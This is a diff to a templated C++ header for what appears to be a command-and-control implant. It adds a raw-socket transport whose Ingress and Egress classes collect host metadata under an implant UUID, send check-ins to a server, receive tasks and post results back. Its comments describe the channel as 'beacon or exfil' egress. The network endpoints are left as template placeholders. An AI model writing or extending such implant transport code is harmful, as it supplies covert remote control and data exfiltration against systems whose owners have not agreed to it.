@@ -1,4 +1,9 @@
 #pragma once
+// WIN32_LEAN_AND_MEAN prevents windows.h from pulling in winsock.h (v1),
+// which conflicts with winsock2.h used by the raw socket transport.
+#ifndef WIN32_LEAN_AND_MEAN
+#define WIN32_LEAN_AND_MEAN
+#endif
 #include <windows.h>
 #include <string>
 #include <vector>
@@ -191,6 +196,67 @@ public:
     void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
         std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
 
+        [[ profile.ns ]]::post(uuid, task_response_msgpack_list);
+    }
+};
+
+//if raw....
+[% elif profile.type == 'raw' %]
+/*
+========================================================================
+RAW SOCKET / POLL-BASED EGRESS
+========================================================================
+Raw socket transport is stateless like HTTP — each beacon or exfil
+opens a fresh TCP/UDP connection, sends, and closes. No persistent
+handles needed. The profile body template defines the exact wire format.
+========================================================================
+*/
+
+class [[ profile.ns ]]_Ingress : public IIngressTransport {
+public:
+    HANDLE get_wait_handle() override {
+        return NULL;
+    }
+    bool initialize() override {
+        return true;
+    }
+
+    nlohmann::json create_get_request(const std::string& uuid, bool full_metadata = false) override {
+        nlohmann::json metadata = nlohmann::json();
+        if (full_metadata) {
+            metadata = populate_metadata();
+        }
+        metadata["implant_uuid"] = uuid;
+        return metadata;
+    }
+
+    nlohmann::json get(std::string implant_uuid) override {
+        nlohmann::json get_array = GetQueue::drain_queue();
+
+        bool populate_this_implants_metadata = true;
+        nlohmann::json this_implants_get = this->create_get_request(implant_uuid, populate_this_implants_metadata);
+        get_array.push_back(this_implants_get);
+
+        DEBUG_LOG("CHECKIN DATA -> SERVER (raw)");
+        DEBUG_LOG(get_array.dump(4));
+
+        std::vector<uint8_t> get_as_msgpack = this->pack_to_msgpack(get_array);
+
+        std::vector<uint8_t> response = [[ profile.ns ]]::get(get_as_msgpack);
+
+        nlohmann::json task_array = nlohmann::json::array();
+        if (!response.empty()) {
+            task_array = this->unpack_to_json(response);
+        }
+
+        return task_array;
+    }
+};
+
+class [[ profile.ns ]]_Egress : public IEgressTransport {
+public:
+    void send_response(const std::string& uuid, const nlohmann::json& task_response_array) override {
+        std::vector<uint8_t> task_response_msgpack_list = this->pack_to_msgpack(task_response_array);
         [[ profile.ns ]]::post(uuid, task_response_msgpack_list);
     }
 };
